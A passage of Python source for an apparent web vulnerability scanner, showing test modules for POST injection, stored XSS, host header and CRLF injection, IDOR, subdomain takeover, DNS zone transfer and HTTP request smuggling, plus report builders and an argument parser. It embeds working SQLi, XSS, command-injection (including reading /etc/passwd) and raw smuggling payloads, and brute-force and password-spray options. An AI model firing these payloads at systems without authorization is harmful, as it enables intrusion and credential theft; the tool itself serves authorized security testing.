                    "recommendation": "Restrict access to admin interfaces by IP. Require MFA for admin paths. Remove debug/diagnostic endpoints from production."})
                found_count += 1
        except Exception:
            pass
    if found_count == 0:
        good("No admin/escalation paths found accessible")
    _module_done("privesc")

# ═══ MODULE 26 — POST INJECTION ══════════════════════════════════
def post_inject_scan(url):
    if _module_skip("post_inject"): info("Skipping POST injection (already done)"); return
    section("MODULE 26 — POST BODY INJECTION TESTING","📮")
    SQL_ERRORS = ["sql syntax","mysql_fetch","database error","pg_query","odbc sql",
                  "sqlite_","ora-","syntax error"]
    XSS_PAYLOADS_SHORT = ["<script>alert(1)</script>","<img src=x onerror=alert(1)>",
                          "'\"><script>alert(1)</script>"]
    SQLI_POST = ["'","' OR '1'='1","' OR 1=1--","1' ORDER BY 1--",
                 "' UNION SELECT NULL--","\" OR \"1\"=\"1"]
    CMDI_POST = [";id","|id","$(id)","`id`",";cat /etc/passwd"]
    POST_PARAMS = [
        {"username":"test","password":"test"},
        {"search":"test","q":"test"},
        {"name":"test","email":"test@test.com"},
        {"message":"hello","comment":"hello"},
        {"data":"test","input":"test"},
    ]
    found_issues = False
    for base_data in POST_PARAMS[:3]:
        for field in base_data:
            for payload in SQLI_POST + XSS_PAYLOADS_SHORT[:2] + CMDI_POST[:2]:
                data = dict(base_data)
                data[field] = payload
                try:
                    r = rpost(url, data=data, timeout=TIMEOUT)
                    body_low = r.text.lower()
                    if any(sig in body_low for sig in SQL_ERRORS):
                        vuln(f"POST SQL injection field='{field}' payload='{payload[:30]}'", "Critical")
                        add("post_inject", {"field": field, "payload": payload,
                            "type": "SQLi", "severity": "Critical",
                            "title": f"POST SQL Injection in Field '{field}'",
                            "description": f"Database error signature in POST response. Field '{field}' with payload '{payload[:80]}'.",
                            "recommendation": "Use parameterized queries for all POST body parameters."})
                        found_issues = True
                    elif payload in r.text:
                        vuln(f"POST XSS reflection field='{field}' payload='{payload[:30]}'", "High")
                        add("post_inject", {"field": field, "payload": payload,
                            "type": "XSS", "severity": "High",
                            "title": f"POST Reflected XSS in Field '{field}'",
                            "description": f"XSS payload reflected in POST response. Field '{field}'.",
                            "recommendation": "HTML-encode all POST parameters before rendering. Implement CSP."})
                        found_issues = True
                    elif any(sig in body_low for sig in ["uid=","root:x:","www-data"]):
                        vuln(f"POST command injection field='{field}' payload='{payload[:30]}'", "Critical")
                        add("post_inject", {"field": field, "payload": payload,
                            "type": "CMDi", "severity": "Critical",
                            "title": f"POST Command Injection in Field '{field}'",
                            "description": f"Command output signature in POST response. Field '{field}'.",
                            "recommendation": "Never pass POST body data to shell functions. Apply strict input validation."})
                        found_issues = True
                except Exception:
                    pass
    if not found_issues:
        good("No POST injection detected")
    _module_done("post_inject")

# ═══ MODULE 27 — STORED XSS ══════════════════════════════════════
def stored_xss_scan(url):
    if _module_skip("stored_xss"): info("Skipping stored XSS (already done)"); return
    section("MODULE 27 — STORED XSS TESTING","💾")
    MARKER = "WSPROBE_XSS_7x9z"
    STORED_PAYLOADS = [
        f"<script>alert('{MARKER}')</script>",
        f"<img src=x onerror=alert('{MARKER}')>",
        f"<svg onload=alert('{MARKER}')>",
        f"'\"><script>alert('{MARKER}')</script>",
        f"<details open ontoggle=alert('{MARKER}')>",
    ]
    POST_PATHS = ["/comment", "/guestbook", "/feedback", "/forum/post",
                  "/search", "/contact", "/message", "/review"]
    base = url.rstrip("/")
    for path in POST_PATHS:
        for payload in STORED_PAYLOADS[:2]:
            try:
                # Submit
                r1 = rpost(base + path, data={"message": payload, "comment": payload,
                                               "content": payload, "text": payload}, timeout=8)
                # Retrieve
                r2 = rget(base + path, timeout=TIMEOUT)
                if MARKER in r2.text:
                    vuln(f"Stored XSS at {path}", "Critical")
                    add("stored_xss", {"path": path, "payload": payload, "severity": "Critical",
                        "title": f"Stored XSS at {base+path}",
                        "description": f"Stored XSS payload persisted and reflected at {path}.",
                        "recommendation": "HTML-encode stored content before rendering. Implement CSP. Use DOMPurify on the client side."})
                    break
            except Exception:
                pass
    _module_done("stored_xss")

# ═══ MODULE 28 — HOST HEADER INJECTION ═══════════════════════════
def host_header_injection(url):
    if _module_skip("hostheader"): info("Skipping host header injection (already done)"); return
    section("MODULE 28 — HOST HEADER INJECTION","🏠")
    EVIL_HOSTS = ["evil.com", "attacker.com", "localhost", "127.0.0.1",
                  "169.254.169.254", "internal.corp"]
    try:
        orig = rget(url, timeout=TIMEOUT)
        orig_body = orig.text
    except Exception as e:
        err(f"Host header injection baseline: {e}"); _module_done("hostheader"); return

    found_hhi = False
    for evil in EVIL_HOSTS:
        try:
            r = rget(url, headers={"Host": evil, "X-Forwarded-Host": evil}, timeout=TIMEOUT)
            if evil in r.text and evil not in orig_body:
                vuln(f"Host header reflected in response: Host={evil}", "High")
                add("hostheader", {"evil_host": evil, "severity": "High",
                    "title": f"Host Header Injection — '{evil}' Reflected",
                    "description": f"Injected Host: {evil} was reflected in the response body. This can lead to password reset poisoning, cache poisoning, and SSRF.",
                    "recommendation": "Whitelist allowed Host header values. Never use the Host header value in generated URLs without validation."})
                found_hhi = True
        except Exception:
            pass
    if not found_hhi:
        good("No host header injection detected")
    _module_done("hostheader")

# ═══ MODULE 29 — CRLF INJECTION ══════════════════════════════════
def crlf_scan(url):
    if _module_skip("crlf"): info("Skipping CRLF (already done)"); return
    section("MODULE 29 — CRLF INJECTION","↩")
    CRLF_PAYLOADS = [
        "%0d%0aSet-Cookie:crlftest=1",
        "%0aSet-Cookie:crlftest=1",
        "%0d%0aX-CRLF-Test:injected",
        "\r\nSet-Cookie:crlftest=1",
        "%E5%98%8A%E5%98%8DSet-Cookie:crlftest=1",
        "%0d%0a%0d%0a<script>alert(1)</script>",
    ]
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    all_params = list(params.keys()) if params else ["url","redirect","next","path"]
    found_crlf = False
    for param in all_params[:5]:
        for payload in CRLF_PAYLOADS:
            tp = {param: [payload]}
            test_url = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
            try:
                r = rget(test_url, allow_redirects=False, timeout=6)
                if "crlftest" in str(r.headers).lower() or "x-crlf-test" in str(r.headers).lower():
                    vuln(f"CRLF injection param='{param}' payload='{payload[:40]}'", "High")
                    add("crlf", {"param": param, "payload": payload, "severity": "High",
                        "title": f"CRLF Injection in Parameter '{param}'",
                        "description": f"CRLF sequence injected a new HTTP header in the response. Parameter: '{param}'.",
                        "recommendation": "Strip or reject CR (\\r) and LF (\\n) characters from all user-supplied input used in HTTP headers."})
                    found_crlf = True
                    break
            except Exception:
                pass
        if found_crlf: break
    if not found_crlf:
        good("No CRLF injection detected")
    _module_done("crlf")

# ═══ MODULE 30 — IDOR ════════════════════════════════════════════
def idor_scan(url, skip_idor=False):
    if _module_skip("idor"): info("Skipping IDOR (already done)"); return
    if skip_idor: info("IDOR skipped (--no-idor flag)"); _module_done("idor"); return
    section("MODULE 30 — INSECURE DIRECT OBJECT REFERENCE (IDOR)","🔢")
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    # Find numeric params (likely object IDs)
    id_params = [p for p, v in params.items() if v and v[0].isdigit()]
    if not id_params:
        id_params = ["id","user_id","account","order","invoice","profile","doc",
                     "file","record","ticket","item","post","comment"]

    found_idor = False
    for param in id_params[:5]:
        try:
            orig_val = params.get(param, ["1"])[0]
            orig_id = int(orig_val) if orig_val.isdigit() else 1
            baseline_params = dict(params); baseline_params[param] = [str(orig_id)]
            baseline_url = parsed._replace(query=urlencode(baseline_params, doseq=True)).geturl()
            r_baseline = rget(baseline_url, timeout=TIMEOUT)
            baseline_len = len(r_baseline.text)
            for test_id in [orig_id - 1, orig_id + 1, orig_id + 100, 0, 1, 2, 999]:
                if test_id == orig_id or test_id < 0: continue
                tp = dict(params); tp[param] = [str(test_id)]
                test_url2 = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
                r_test = rget(test_url2, allow_redirects=False, timeout=TIMEOUT)
                if r_test.status_code == 200 and abs(len(r_test.text) - baseline_len) > 100:
                    vuln(f"Potential IDOR: param='{param}' original={orig_id} accessed={test_id}", "High")
                    add("idor", {"param": param, "original_id": orig_id,
                        "accessed_id": test_id, "severity": "High",
                        "title": f"Potential IDOR in Parameter '{param}'",
                        "description": f"Different response content when changing '{param}' from {orig_id} to {test_id}. This may indicate access to other users' data without authorization.",
                        "recommendation": "Implement server-side authorization checks for every object access. Use unpredictable object identifiers (UUIDs). Verify the authenticated user owns the requested object."})
                    found_idor = True
                    break
        except Exception:
            pass
        if found_idor: break
    if not found_idor:
        good("No obvious IDOR detected")
    _module_done("idor")

# ═══ MODULE 31 — SUBDOMAIN TAKEOVER ══════════════════════════════
def subdomain_takeover(url, subdomains=None):
    if _module_skip("subdomain_takeover"): info("Skipping subdomain takeover (already done)"); return
    section("MODULE 31 — SUBDOMAIN TAKEOVER CHECK","⚠")
    TAKEOVER_SIGS = {
        "GitHub Pages":    ["there isn't a github pages site here","for github pages"],
        "Heroku":          ["no such app","herokucdn.com","there's nothing here"],
        "AWS S3":          ["nosuchbucket","the specified bucket does not exist"],
        "Shopify":         ["sorry, this shop is currently unavailable"],
        "Zendesk":         ["help center closed","this zendesk is not configured"],
        "Netlify":         ["not found - request id"],
        "Surge.sh":        ["project not found"],
        "Bitbucket":       ["repository not found"],
        "Ghost":           ["the thing you were looking for is no longer here"],
        "Readme.io":       ["project doesnt exist... yet"],
        "Unbounce":        ["the requested url was not found"],
        "Squarespace":     ["no such page"],
        "Cargo":           ["404 not found"],
        "Fastly":          ["fastly error: unknown domain"],
        "Azure":           ["404 web site not found","microsoft azure"],
    }
    if not subdomains:
        subdomains = []
    parsed = urlparse(url)
    domain = parsed.netloc
    # Also check the main domain
    targets = [f"https://{s}" for s in subdomains[:20]] + [url]

    found_takeover = False
    for target in targets:
        try:
            r = rget(target, timeout=TIMEOUT)
            body_low = r.text.lower()[:5000]
            for svc, sigs in TAKEOVER_SIGS.items():
                if any(sig in body_low for sig in sigs):
                    vuln(f"Potential subdomain takeover [{svc}]: {target}", "High")
                    add("subdomain_takeover", {"target": target, "service": svc,
                        "severity": "High",
                        "title": f"Subdomain Takeover Risk — {svc} at {target}",
                        "description": f"The target {target} shows signs of an unclaimed {svc} resource. An attacker may be able to claim this and serve malicious content from your domain.",
                        "recommendation": "Delete the DNS record for unused subdomains. Claim the cloud resource or remove the CNAME pointing to it."})
                    found_takeover = True
                    break
        except Exception:
            pass
    if not found_takeover:
        good("No subdomain takeover indicators found")
    _module_done("subdomain_takeover")

# ═══ MODULE 32 — DNS ZONE TRANSFER ═══════════════════════════════
def dns_zone_transfer(domain):
    if _module_skip("dns_axfr"): info("Skipping DNS AXFR (already done)"); return
    section("MODULE 32 — DNS ZONE TRANSFER (AXFR)","📡")
    try:
        # Find authoritative nameservers
        result = subprocess.run(
            ["nslookup", "-type=NS", domain],
            capture_output=True, text=True, timeout=10
        )
        ns_servers = re.findall(r'nameserver\s*=\s*(\S+)', result.stdout, re.IGNORECASE)
        if not ns_servers:
            # Try dig
            try:
                r2 = subprocess.run(
                    ["dig", "NS", domain, "+short"],
                    capture_output=True, text=True, timeout=10
                )
                ns_servers = [s.strip().rstrip(".") for s in r2.stdout.splitlines() if s.strip()]
            except Exception:
                pass

        if not ns_servers:
            info(f"Could not determine nameservers for {domain}")
            _module_done("dns_axfr"); return

        info(f"Nameservers found: {', '.join(ns_servers[:5])}")
        for ns in ns_servers[:3]:
            ns = ns.rstrip(".")
            try:
                # Attempt AXFR
                axfr_result = subprocess.run(
                    ["dig", f"@{ns}", domain, "AXFR"],
                    capture_output=True, text=True, timeout=15
                )
                if "Transfer failed" in axfr_result.stdout or "REFUSED" in axfr_result.stdout:
                    good(f"Zone transfer refused by {ns}")
                elif axfr_result.stdout.count("\n") > 5 and domain in axfr_result.stdout:
                    vuln(f"DNS zone transfer ALLOWED from {ns}!", "High")
                    add("dns_axfr", {"nameserver": ns, "severity": "High",
                        "title": f"DNS Zone Transfer Allowed — {ns}",
                        "description": f"Nameserver {ns} allowed a full zone transfer (AXFR). This exposes your complete internal DNS infrastructure.",
                        "recommendation": "Configure nameservers to only allow zone transfers to authorized secondary nameservers. Restrict AXFR by IP."})
                else:
                    good(f"Zone transfer refused or empty from {ns}")
            except Exception as ex:
                vlog(f"AXFR attempt error {ns}: {ex}")
    except Exception as e:
        err(f"DNS AXFR: {e}")
    _module_done("dns_axfr")

# ═══ MODULE 33 — HTTP REQUEST SMUGGLING ══════════════════════════
def request_smuggling(url, skip_smuggling=False):
    if _module_skip("smuggling"): info("Skipping smuggling (already done)"); return
    if skip_smuggling: info("Smuggling skipped (--no-smuggling flag)"); _module_done("smuggling"); return
    section("MODULE 33 — HTTP REQUEST SMUGGLING","📨")

    # CL.TE payload
    CL_TE = (
        "POST / HTTP/1.1\r\n"
        f"Host: {urlparse(url).netloc}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "G"
    )
    # TE.CL payload
    TE_CL = (
        "POST / HTTP/1.1\r\n"
        f"Host: {urlparse(url).netloc}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "5c\r\n"
        "GPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n"
        "0\r\n"
        "\r\n"
    )

    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_tls = (parsed.scheme == "https")

    for label, payload in [("CL.TE", CL_TE), ("TE.CL", TE_CL)]:
        try:
            if use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(socket.socket(), server_hostname=host)
            else:
                s = socket.socket()
            s.settimeout(10)
            s.connect((host, port))
            s.send(payload.encode())
            s.settimeout(3)
            resp = b""
            try:
                while True:
                    chunk = s.recv(1024)
                    if not chunk: break
                    resp += chunk
            except socket.timeout:
                pass
            s.close()
            resp_str = resp.decode("utf-8", errors="replace")
            if "unrecognized method GPOST" in resp_str or "400" in resp_str[:50]:
                vuln(f"HTTP Request Smuggling ({label}) — server may be vulnerable", "High")
                add("smuggling", {"type": label, "severity": "High",
                    "title": f"HTTP Request Smuggling ({label}) Potential",
                    "description": f"Server response to {label} smuggling payload indicates potential vulnerability. Response: {resp_str[:200]}",
                    "recommendation": "Upgrade to HTTP/2. Normalize conflicting Content-Length/Transfer-Encoding headers. Use a modern reverse proxy that rejects ambiguous requests."})
            else:
                good(f"Smuggling {label}: no obvious indicator")
        except Exception as ex:
            vlog(f"Smuggling {label}: {ex}")
    _module_done("smuggling")


# ═══ COMPARISON MODE HELPER ═══════════════════════════════════════
def compare_reports(file1, file2):
    """Compare two JSON scan reports and show diff."""
    try:
        with open(file1) as f: r1 = json.load(f)
        with open(file2) as f: r2 = json.load(f)
        section("SCAN COMPARISON","🔄")
        cats = set(list(r1.keys()) + list(r2.keys()))
        for cat in sorted(cats):
            c1 = len(r1.get(cat,[]))
            c2 = len(r2.get(cat,[]))
            if c1 != c2:
                diff = c2 - c1
                arrow = "▲" if diff > 0 else "▼"
                col = Fore.RED if diff > 0 else Fore.GREEN
                print(f"  {col}{arrow} {cat}: {c1} → {c2} ({'+' if diff>0 else ''}{diff}){Style.RESET_ALL}")
            else:
                print(f"  {Fore.CYAN}= {cat}: {c1} (no change){Style.RESET_ALL}")
    except Exception as e:
        err(f"Comparison failed: {e}")

# ═══ REPORT BUILDER ═══════════════════════════════════════════════
def build_report(target, out_dir="./reports", cvss_min=0.0):
    os.makedirs(out_dir, exist_ok=True)
    ts   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    base = os.path.join(out_dir, f"webscanpro_{ts}")

    # JSON — enhanced with confirmed/potential fields
    jpath = base + ".json"
    with open(jpath, "w", encoding="utf-8") as f:
        json.dump(dict(FINDINGS), f, indent=2, default=str)
    good(f"JSON report saved: {jpath}")

    # HTML report (Confirmed + Potential tiers)
    hpath = base + ".html"
    try:
        _build_html(target, hpath, cvss_min)
        good(f"HTML report saved: {hpath}")
    except Exception as _html_err:
        import traceback as _tb
        err(f"HTML report error: {_html_err}")
        err(_tb.format_exc()[-400:])
        with open(hpath, "w", encoding="utf-8") as _f:
            _f.write(f"<html><body><h1>WebScan Pro — Report Error</h1>"
                     f"<pre>{_html_err}</pre>"
                     f"<p>See JSON report: {jpath}</p></body></html>")
        warn(f"Fallback HTML saved: {hpath}")

    # Expert Validation Report (4th report — Critical/High manual verification)
    expert_path = base + "_expert.html"
    try:
        _build_expert_report(target, expert_path)
        good(f"Expert Validation Report saved: {expert_path}")
    except Exception as _exp_err:
        import traceback as _tb3
        err(f"Expert report error: {_exp_err}")
        err(_tb3.format_exc()[-400:])
        expert_path = None

    return hpath, jpath, expert_path

def _build_html(target, hpath, cvss_min=0.0):
    counts = _sev_counts()
    total  = _total()
    score  = _risk_score()
    elapsed_str = elapsed()
    ts_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    all_findings = []
    for cat, items in FINDINGS.items():
        meta = CAT_META.get(cat, {})
        icon, label = CAT_TITLES.get(cat, ("🔍", cat.upper()))
        for item in items:
            cvss_val = meta.get("cvss", 0.0)
            if cvss_val < cvss_min: continue
            all_findings.append({**item, "_cat": cat, "_icon": icon, "_label": label,
                                  "_owasp": meta.get("owasp",""),
                                  "_owasp_name": meta.get("owasp_name",""),
                                  "_cwe": meta.get("cwe",""),
                                  "_cvss": cvss_val,
                                  "_biz": meta.get("biz","")})

    sev_order = {"Critical":0,"High":1,"Medium":2,"Low":3,"Info":4}
    all_findings.sort(key=lambda x: sev_order.get(x.get("severity","Info"),5))

    # Chart.js data
    chart_labels = ["Critical","High","Medium","Low","Info"]
    chart_data   = [counts.get(s,0) for s in chart_labels]
    chart_colors = ["#e74c3c","#e67e22","#f1c40f","#3498db","#95a5a6"]

    # v11.5: Split findings into Confirmed and Potential tiers
    confirmed_findings  = [f for f in all_findings if f.get("confirmed", False)]
    potential_findings  = [f for f in all_findings if not f.get("confirmed", False)]

    def _render_findings(findings_list):
        rows = ""
        for f in findings_list:
            sev = f.get("severity","Info")
            col_map = {"Critical":"#e74c3c","High":"#e67e22","Medium":"#f1c40f","Low":"#3498db","Info":"#95a5a6"}
            col = col_map.get(sev,"#95a5a6")
            title = f.get("title", f.get("url", f.get("path","Finding")))
            desc  = f.get("description","")
            rec   = f.get("recommendation","")
            evid  = f.get("evidence","")
            owasp = f.get("_owasp","")
            owasp_name = f.get("_owasp_name","")
            cwe   = f.get("_cwe","")
            cvss  = f.get("_cvss",0.0)
            biz   = f.get("_biz","")
            label = f.get("_label","")
            icon  = f.get("_icon","🔍")
            is_confirmed = f.get("confirmed", False)
            conf_badge = '<span class="conf-badge confirmed">✅ CONFIRMED</span>' if is_confirmed else '<span class="conf-badge potential">⚠️ POTENTIAL</span>'
            rows += f"""
        <div class="finding" style="border-left:4px solid {col}">
          <div class="finding-header">
            <span class="badge" style="background:{col}">{sev}</span>
            {conf_badge}
            <span class="finding-title">{icon} [{label}] {title}</span>
          </div>
          <table class="meta-table">
            {'<tr><th>OWASP</th><td>' + owasp + ' — ' + owasp_name + '</td></tr>' if owasp else ''}
            {'<tr><th>CWE</th><td>' + cwe + '</td></tr>' if cwe else ''}
            {'<tr><th>CVSS</th><td>' + str(cvss) + '</td></tr>' if cvss else ''}
          </table>
          {'<div class="detail-block"><b>Description:</b> ' + desc + '</div>' if desc else ''}
          {'<div class="detail-block evid"><b>Evidence:</b> ' + evid + '</div>' if evid else ''}
          {'<div class="detail-block biz"><b>Business Impact:</b> ' + biz + '</div>' if biz else ''}
          {'<div class="detail-block rec"><b>Recommendation:</b> ' + rec + '</div>' if rec else ''}
        </div>"""
        return rows

    rows_html = ""
    if confirmed_findings:
        rows_html += '<div class="tier-header">✅ CONFIRMED VULNERABILITIES (' + str(len(confirmed_findings)) + ')</div>'
        rows_html += _render_findings(confirmed_findings)
    if potential_findings:
        rows_html += '<div class="tier-header pot">⚠️ POTENTIAL VULNERABILITIES (' + str(len(potential_findings)) + ') — Require Manual Verification</div>'
        rows_html += _render_findings(potential_findings)

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WebScan Pro v{VERSION} — {target}</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
<style>
  :root{{--bg:#0d1117;--card:#161b22;--border:#30363d;--text:#c9d1d9;--accent:#58a6ff;--muted:#8b949e}}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;padding:2rem 1rem}}
  .container{{max-width:1100px;margin:0 auto}}
  h1{{color:var(--accent);font-size:1.8rem;margin-bottom:.3rem}}
  .subtitle{{color:var(--muted);font-size:.9rem;margin-bottom:2rem}}
  .summary-grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:1rem;margin-bottom:2rem}}
  .stat-card{{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:1rem;text-align:center}}
  .stat-card .num{{font-size:2rem;font-weight:700}}
  .stat-card .lbl{{font-size:.75rem;color:var(--muted);text-transform:uppercase;letter-spacing:.05em}}
  .c-crit{{color:#e74c3c}}.c-high{{color:#e67e22}}.c-med{{color:#f1c40f}}
  .c-low{{color:#3498db}}.c-info{{color:#95a5a6}}.c-score{{color:var(--accent)}}
  .chart-wrap{{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:1.5rem;margin-bottom:2rem;max-width:420px}}
  .findings-title{{font-size:1.2rem;font-weight:700;margin-bottom:1rem;color:var(--accent)}}
  .finding{{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:1.2rem;margin-bottom:1rem}}
  .finding-header{{display:flex;align-items:center;gap:.7rem;margin-bottom:.7rem}}
  .badge{{border-radius:4px;padding:.2rem .6rem;font-size:.75rem;font-weight:700;color:#fff}}
  .finding-title{{font-weight:600;font-size:.95rem}}
  .meta-table{{width:100%;border-collapse:collapse;font-size:.8rem;margin:.5rem 0}}
  .meta-table th{{color:var(--muted);padding:.2rem .5rem;text-align:left;white-space:nowrap}}
  .meta-table td{{color:var(--text);padding:.2rem .5rem}}
  .detail-block{{font-size:.85rem;margin:.4rem 0;line-height:1.5;padding:.5rem;background:#0d1117;border-radius:4px}}
  .biz{{color:#f9ca24}}.rec{{color:#6bcb77}}
  .log-section{{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:1rem;margin-top:2rem}}
  .log-section pre{{font-size:.75rem;color:var(--muted);white-space:pre-wrap;max-height:300px;overflow-y:auto}}
  footer{{text-align:center;color:var(--muted);font-size:.75rem;margin-top:2rem;padding-top:1rem;border-top:1px solid var(--border)}}
</style>
</head>
<body>
<div class="container">
  <h1>🔍 WebScan Pro v{VERSION}</h1>
  <div class="subtitle">Target: <strong>{target}</strong> &nbsp;|&nbsp; Scan Time: {ts_str} &nbsp;|&nbsp; Duration: {elapsed_str}</div>
  <div class="summary-grid">
    <div class="stat-card"><div class="num c-score">{score}</div><div class="lbl">Risk Score</div></div>
    <div class="stat-card"><div class="num">{total}</div><div class="lbl">Total Findings</div></div>
    <div class="stat-card"><div class="num c-crit">{counts.get('Critical',0)}</div><div class="lbl">Critical</div></div>
    <div class="stat-card"><div class="num c-high">{counts.get('High',0)}</div><div class="lbl">High</div></div>
    <div class="stat-card"><div class="num c-med">{counts.get('Medium',0)}</div><div class="lbl">Medium</div></div>
    <div class="stat-card"><div class="num c-low">{counts.get('Low',0)}</div><div class="lbl">Low</div></div>
    <div class="stat-card"><div class="num c-info">{counts.get('Info',0)}</div><div class="lbl">Info</div></div>
  </div>
  <div class="chart-wrap">
    <canvas id="sevChart" height="200"></canvas>
  </div>
  <div class="findings-title">Findings ({len(all_findings)} total — {len(confirmed_findings)} Confirmed, {len(potential_findings)} Potential{' — CVSS ≥ ' + str(cvss_min) if cvss_min else ''})</div>
  {rows_html if rows_html else '<div class="finding"><div class="finding-header"><span class="finding-title">No findings match the current filter.</span></div></div>'}
  <div class="log-section">
    <div class="findings-title">Scan Log</div>
    <pre>{chr(10).join(LOG[-200:])}</pre>
  </div>
  <footer>WebScan Pro v{VERSION} — For authorized security testing only. OWASP Top 10 (2021) · CVSS v3.1</footer>
</div>
<script>
const ctx = document.getElementById('sevChart').getContext('2d');
new Chart(ctx, {{
  type: 'doughnut',
  data: {{
    labels: {chart_labels},
    datasets: [{{data: {chart_data}, backgroundColor: {chart_colors}, borderWidth: 0}}]
  }},
  options: {{
    plugins: {{legend: {{labels: {{color:'#c9d1d9'}}}}}},
    cutout: '60%'
  }}
}});
</script>
</body>
</html>"""

    with open(hpath, "w", encoding="utf-8") as f:
        f.write(html)

# ═══ PDF EXPORT ═══════════════════════════════════════════════════
def export_pdf(html_path):
    try:
        from weasyprint import HTML
        pdf_path = html_path.replace(".html", ".pdf")
        HTML(filename=html_path).write_pdf(pdf_path)
        good(f"PDF report saved: {pdf_path}")
        return pdf_path
    except ImportError:
        warn("weasyprint not installed — skipping PDF export (pip install weasyprint)")
    except Exception as e:
        err(f"PDF export: {e}")
    return None

# ═══ BURP XML EXPORT ══════════════════════════════════════════════
def export_burp_xml(target, out_dir="./reports"):
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    xpath = os.path.join(out_dir, f"webscanpro_burp_{ts}.xml")
    lines = ['<?xml version="1.0" encoding="UTF-8"?>',
             '<issues burpVersion="2023.10" exportTime="' + ts + '">']
    for cat, items in FINDINGS.items():
        meta = CAT_META.get(cat, {})
        for item in items:
            sev  = item.get("severity","Info")
            conf = "Certain" if sev in ("Critical","High") else "Firm"
            title = item.get("title","Finding")
            desc  = item.get("description","")
            rec   = item.get("recommendation","")
            owasp = meta.get("owasp","")
            cwe   = meta.get("cwe","")
            lines += [
                "  <issue>",
                f"    <serialNumber>{abs(hash(title)) % 100000}</serialNumber>",
                f"    <type>0</type>",
                f"    <name><![CDATA[{title}]]></name>",
                f"    <host><![CDATA[{target}]]></host>",
                f"    <path><![CDATA[{item.get('path', item.get('url','/'))}]]></path>",
                f"    <location><![CDATA[{item.get('param','')}]]></location>",
                f"    <severity>{sev}</severity>",
                f"    <confidence>{conf}</confidence>",
                f"    <issueBackground><![CDATA[{desc}]]></issueBackground>",
                f"    <remediationBackground><![CDATA[{rec}]]></remediationBackground>",
                f"    <references><![CDATA[{owasp} {cwe}]]></references>",
                "  </issue>",
            ]
    lines.append("</issues>")
    with open(xpath, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    good(f"Burp XML saved: {xpath}")
    return xpath

# ═══ ARGUMENT PARSER ══════════════════════════════════════════════
def parse_args():
    p = argparse.ArgumentParser(
        prog="webscan_pro.py",
        description=f"WebScan Pro v{VERSION} — Professional Web Penetration Testing Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  python3 webscan_pro.py http://target.com
  python3 webscan_pro.py http://target.com -v --pdf
  python3 webscan_pro.py http://target.com -q --cvss 7.0
  python3 webscan_pro.py http://target.com --resume scan_state.json
  python3 webscan_pro.py --compare report1.json report2.json
  python3 webscan_pro.py http://target.com --proxy http://127.0.0.1:8080
  python3 webscan_pro.py http://target.com --cookie "session=abc123"
  python3 webscan_pro.py http://target.com --only sqli,xss,nosql_inject
  python3 webscan_pro.py http://target.com --only ssl,headers,cors
  python3 webscan_pro.py http://target.com --fail-on-severity high
""")
    p.add_argument("url",             nargs="?",   help="Target URL (e.g. http://target.com)")
    p.add_argument("-v","--verbose",  action="store_true", help="Verbose output — show every request")
    p.add_argument("-q","--quiet",    action="store_true", help="Quiet — only show vulnerabilities")
    p.add_argument("-y","--yes",      action="store_true", help="Skip all prompts (non-interactive)")
    p.add_argument("-w","--wordlist", default=None,        help="Custom wordlist file")
    p.add_argument("--combo",         default=None,        help="Credential combo file (user:pass per line) for login brute-force")
    p.add_argument("--fail-on-severity", default=None,        help="Exit with code 1 if finding >= this severity (critical/high/medium/low) — for CI/CD pipelines")
    p.add_argument("--spray",         default=None,        help="Single password to spray across common usernames")
    p.add_argument("-o","--output",   default=os.path.expanduser("~/webscan-reports"),
                                                           help="Report output directory (default: ~/webscan-reports)")
    p.add_argument("-t","--threads",  type=int,   default=None, help="Thread count (default: 50)")
    p.add_argument("--timeout",       type=int,   default=None, help="Request timeout seconds (default: 7)")
    p.add_argument("--proxy",         default=None,        help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    p.add_argument("-c","--cookie",    default=None,        help="Session cookies (e.g. 'session=abc; auth=1')")
    p.add_argument("-U","--username", default=None,        help="Username for auth bypass testing")
    p.add_argument("-P","--password", default=None,        help="Password for auth bypass testing")
    p.add_argument("--resume",        default=None,        help="Resume from checkpoint JSON file")
    p.add_argument("--compare",       nargs=2, metavar=("FILE1","FILE2"), help="Compare two JSON scan reports")
    p.add_argument("--cvss",          type=float, default=0.0, help="Min CVSS score filter for HTML report (default: 0.0)")
    p.add_argument("--pdf",           action="store_true", help="Force PDF generation (auto if weasyprint installed)")
    p.add_argument("--burp",          action="store_true", help="Export Burp Suite XML (auto-generated)")
    p.add_argument("--version",       action="store_true", help="Show version and exit")
    # Skip flags
    p.add_argument("--no-ports",      action="store_true", help="Skip port scanning")
    p.add_argument("--no-subs",       action="store_true", help="Skip subdomain enumeration")
    p.add_argument("--no-ssti",       action="store_true", help="Skip SSTI testing")
    p.add_argument("--no-cmdi",       action="store_true", help="Skip command injection testing")
